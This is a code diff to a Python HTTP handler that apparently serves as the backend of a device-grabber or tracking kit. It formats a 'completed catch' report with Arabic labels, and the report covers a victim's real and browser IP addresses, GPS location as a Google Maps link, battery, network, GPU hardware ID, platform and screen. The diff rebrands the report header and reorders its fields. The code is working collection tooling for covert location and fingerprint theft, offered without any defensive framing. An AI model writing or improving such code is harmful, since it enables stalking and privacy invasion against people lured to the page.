@@ -14,21 +14,21 @@ class handler(BaseHTTPRequestHandler):
             device = data.get('device', {})
             gps = device.get('gps')
             
-            maps_link = "غير متوفر"
+            maps_link = "مخفي"
             if isinstance(gps, dict):
                 maps_link = f"https://www.google.com/maps?q={gps.get('lat')},{gps.get('lon')}"
 
             message = (
-                "⚠️ **صيدة نجوسية مكتملة** ⚠️\n"
+                "🚀 **صيدة ALSSRY المكتملة** 🚀\n"
                 "━━━━━━━━━━━━━━━\n"
-                f"📝 **النشاط:** {data.get('action')}\n"
-                f"🔥 **IP الحقيقي (النجوسية):** `{device.get('real_ip', 'N/A')}`\n"
+                f"📝 **النشاط:** {data.get('action')}\n\n"
+                f"🔋 **البطارية:** {device.get('battery', 'N/A')}\n"
+                f"📶 **الشبكة:** {device.get('network', 'N/A')}\n"
+                f"🔥 **IP الحقيقي:** `{device.get('real_ip', 'N/A')}`\n"
                 f"🌐 **IP المتصفح:** `{device.get('public_ip', 'N/A')}`\n"
-                f"🔋 **البطارية:** {device.get('battery')}\n"
-                f"🆔 **HW-ID:** `{device.get('gpu_hwid')}`\n"
-                f"📱 **الجهاز:** {device.get('platform')}\n"
-                f"🖥 **الشاشة:** {device.get('screen')}\n"
-                f"📶 **الشبكة:** {device.get('network')}\n\n"
+                f"🆔 **HW-ID:** `{device.get('gpu_hwid', 'N/A')}`\n"
+                f"📱 **الجهاز:** {device.get('platform', 'N/A')}\n"
+                f"🖥 **الشاشة:** {device.get('screen', 'N/A')}\n\n"
                 f"📍 **قوقل ماب:**\n{maps_link}\n"
                 "━━━━━━━━━━━━━━━"
             )
